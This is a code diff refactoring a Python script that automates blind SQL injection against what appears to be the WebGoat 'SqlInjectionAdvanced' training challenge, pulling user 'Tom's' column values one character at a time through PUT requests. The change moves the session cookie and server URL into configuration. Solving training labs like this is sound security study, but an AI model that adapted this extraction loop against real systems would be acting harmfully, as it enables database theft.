@@ -1,21 +1,23 @@
 import json
 import requests
+from config.settings import SESSION_COOKIE, SERVER_URL
 
-def extract_tom_details(cookie, server_url, table_name, columns):
+def extract_tom_details(table_name, columns):
     """
     Extracts details for the user 'Tom' from a specific table.
 
     Args:
-        cookie (str): Session cookie for authentication.
-        server_url (str): The URL of the server to target.
         table_name (str): The table to query.
         columns (list): List of column names in the table.
 
     Returns:
         dict: A dictionary with column names as keys and extracted values as data.
     """
+    if not SESSION_COOKIE or not SERVER_URL:
+        raise ValueError("Server URL or session cookie is not configured in environment settings.")
+
     headers = {
-        'Cookie': cookie,
+        'Cookie': SESSION_COOKIE,
     }
 
     def extract_value(column_name, char_index):
@@ -33,7 +35,7 @@ def extract_tom_details(cookie, server_url, table_name, columns):
                 'password_reg': 'a',
                 'confirm_password_reg': 'a'
             }
-            r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
+            r = requests.put(f'{SERVER_URL}/SqlInjectionAdvanced/challenge', headers=headers, data=data)
 
             try:
                 response = json.loads(r.text)
